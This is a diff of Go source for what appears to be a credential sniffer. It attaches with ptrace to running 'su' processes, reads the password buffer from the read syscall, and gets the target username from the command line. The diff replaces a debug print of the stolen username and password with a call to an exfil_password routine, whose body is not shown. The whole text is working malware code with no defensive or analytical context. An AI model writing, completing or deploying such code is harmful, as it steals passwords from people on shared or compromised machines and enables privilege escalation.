@@ -8,40 +8,38 @@ import (
 	"unicode"
 )
 
-var exfilChannel = make(chan ExfilData)
-
-type ExfilData struct {
-	Username string
-	Password string
-}
-
 func traceSUProcess(pid int) {
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
-	defer syscall.PtraceDetach(pid)
-
-	var regs syscall.PtraceRegs
+	defer func() {
+		syscall.PtraceDetach(pid)
+	}()
+	var wstatus syscall.WaitStatus
 	var readSyscallCount int
 	for {
-		_, err := syscall.Wait4(pid, nil, 0, nil)
+
+		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
 			return
 		}
 
-		err = syscall.PtraceGetRegs(pid, &regs)
-		if err != nil {
-			fmt.Printf("su process died.")
+		if wstatus.Exited() {
+			return
+		}
+
+		var regs syscall.PtraceRegs
+		ptrace_err := syscall.PtraceGetRegs(pid, &regs)
+		if ptrace_err != nil {
+			syscall.PtraceDetach(pid)
 			return
 		}
 		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
 			readSyscallCount++
 			if readSyscallCount == 3 {
-				bufferAddr := uintptr(regs.Rsi)
-				buffer := make([]byte, 511)
-
-				_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
+				buffer := make([]byte, regs.Rdx)
+				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
 					return
 				}
@@ -50,7 +48,6 @@ func traceSUProcess(pid int) {
 					if err != nil {
 						return
 					}
-
 					username := "root"
 					if len(cmdline) > 3 {
 						username = string((cmdline[3:]))
@@ -64,14 +61,13 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
-						//exfiltratePassword(strings.TrimLeft(string(password), "\n"), username)
-						fmt.Printf("u: %s, p: %s\n", username, password)
+						go exfil_password(username, password)
 					}
 				}
-				return
 			}
 
 		}
+
 		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
 			return
